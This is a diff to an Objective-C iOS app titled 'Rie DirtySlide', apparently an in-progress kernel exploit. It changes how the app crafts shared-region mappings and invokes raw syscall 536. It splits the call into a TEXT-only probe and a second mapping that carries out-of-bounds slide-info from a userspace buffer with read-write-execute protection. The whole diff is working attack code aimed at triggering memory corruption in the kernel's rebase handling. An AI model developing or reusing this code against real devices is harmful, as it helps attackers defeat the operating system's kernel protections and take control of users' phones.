@@ -142,7 +142,7 @@ typedef struct {
     self.logView.editable = NO;
     [self.view addSubview:self.logView];
 
-    [self log:@"=== Rie DirtySlide v4 ==="];
+    [self log:@"=== Rie DirtySlide v5 ==="];
     [self log:[NSString stringWithFormat:@"State: %@", self.isRelaunched ? @"RELAUNCH (RESLIDE)" : @"First run"]];
     [self log:@""];
 
@@ -499,16 +499,18 @@ typedef struct {
         }
 
         // ── Build file entries (kernel matches by POSITION order) ──
-        // BOTH mappings use the same cache fd — blob carrier reads page data
-        // from file offset 0 (content doesn't matter for OOB, only slide-info does)
         int mi = 0;
+        long r536 = -1;
+
+        // Copy blob into mmap'd cfg for page-aligned userspace pointer
+        memcpy((uint8_t*)cfg + 0x4000, blob, blobSz);
 
         if (fd_main >= 0) {
+            // ── Test A: TEXT-only probe (no slide info) ──
+            [self log:@"\n── Test A: TEXT-only mapping (no slide) ──"];
             c->files[0].sf_fd = fd_main;
-            c->files[0].sf_mappings_count = 2;  // TEXT + blob carrier
+            c->files[0].sf_mappings_count = 1;
             c->files[0].sf_slide = 0;
-
-            // mapping[mi++]: TEXT header
             c->mappings[mi].sms_address     = 0x180000000ULL;
             c->mappings[mi].sms_size         = HDR_SZ;
             c->mappings[mi].sms_file_offset  = 0;
@@ -516,45 +518,51 @@ typedef struct {
             c->mappings[mi].sms_init_prot     = 1;
             mi++;
 
-            // mapping[mi++]: blob carrier with OOB slide-info
+            c->files[1].sf_fd = -1; c->files[1].sf_mappings_count = 0; c->files[1].sf_slide = 0;
+            c->files[2].sf_fd = -1; c->files[2].sf_mappings_count = 0; c->files[2].sf_slide = 0;
+
+            [self log:[NSString stringWithFormat:@"TEXT-only: 1 file, %d mappings", mi]];
+            errno = 0;
+            long rA = sc(536, 3, c->files, mi, c->mappings);
+            [self log:[NSString stringWithFormat:@"syscall(536) TEXT-only: ret=%ld errno=%d", rA, errno]];
+
+            if (rA != 0) {
+                [self log:@"!! TEXT-only failed — cache fd or basic params rejected"];
+                // Continue anyway to see if blob helps
+            }
+
+            // ── Test B: TEXT + blob with slide-info ──
+            [self log:@"\n── Test B: TEXT + blob carrier (with slide-info) ──"];
+            c->files[0].sf_mappings_count = 2;  // now 2 mappings for file[0]
+            // mapping[mi++]: blob carrier
             c->mappings[mi].sms_address     = BLOB_VA;
             c->mappings[mi].sms_size         = 0x4000;
-            c->mappings[mi].sms_file_offset  = 0;  // read from cache fd (page data irrelevant)
+            c->mappings[mi].sms_file_offset  = 0;
             c->mappings[mi].sms_slide_size   = blobSz;
-            c->mappings[mi].sms_slide_start  = (uint64_t)(uintptr_t)blob;  // userspace slide-info
-            c->mappings[mi].sms_max_prot     = 5;
-            c->mappings[mi].sms_init_prot     = 3;
+            c->mappings[mi].sms_slide_start  = (uint64_t)(uintptr_t)((uint8_t*)cfg + 0x4000);
+            c->mappings[mi].sms_max_prot     = 7;  // R|W|X (must include R|W for rebase)
+            c->mappings[mi].sms_init_prot     = 3;  // R|W
             mi++;
+
+            c->fault_addr = BLOB_VA;  // point fault_addr to blob carrier
+
+            [self log:[NSString stringWithFormat:@"TEXT+blob: file[0].count=%d total=%d blob_in_cfg=%p",
+                c->files[0].sf_mappings_count, mi, (uint8_t*)cfg + 0x4000]];
+            errno = 0;
+            long rB = sc(536, 3, c->files, mi, c->mappings);
+            [self log:[NSString stringWithFormat:@"syscall(536) TEXT+blob: ret=%ld errno=%d", rB, errno]];
+            r536 = rB;  // use this for success/failure check below
         } else {
             c->files[0].sf_fd = -1;
             c->files[0].sf_mappings_count = 0;
             c->files[0].sf_slide = 0;
+            c->files[1].sf_fd = -1; c->files[1].sf_mappings_count = 0; c->files[1].sf_slide = 0;
+            c->files[2].sf_fd = -1; c->files[2].sf_mappings_count = 0; c->files[2].sf_slide = 0;
         }
-
-        // file[1]: unused
-        c->files[1].sf_fd = -1;
-        c->files[1].sf_mappings_count = 0;
-        c->files[1].sf_slide = 0;
-
-        // file[2]: unused
-        c->files[2].sf_fd = -1;
-        c->files[2].sf_mappings_count = 0;
-        c->files[2].sf_slide = 0;
-
-        int totalMappings = mi;
 
         if (fd_main < 0) {
             [self log:@"cache fd not found, using fd=-1 (in-memory)"];
         }
-
-        [self log:[NSString stringWithFormat:@"cfg: file[0].count=%d total=%d fd_main=%d blob=%p blob@0x%llx",
-            c->files[0].sf_mappings_count, totalMappings, fd_main, blob, BLOB_VA]];
-
-        // ── Call syscall 536 — first-mapper ──
-        [self log:@"\n!! CALLING syscall(536) as first-mapper... !!"];
-        errno = 0;
-        long r536 = sc(536, 3, c->files, totalMappings, c->mappings);
-        [self log:[NSString stringWithFormat:@"syscall(536,...): ret=%ld errno=%d", r536, errno]];
 
         if (r536 == 0) {
             [self log:@"\n*** FIRST-MAPPER SUCCESS! syscall 536 returned 0! ***"];
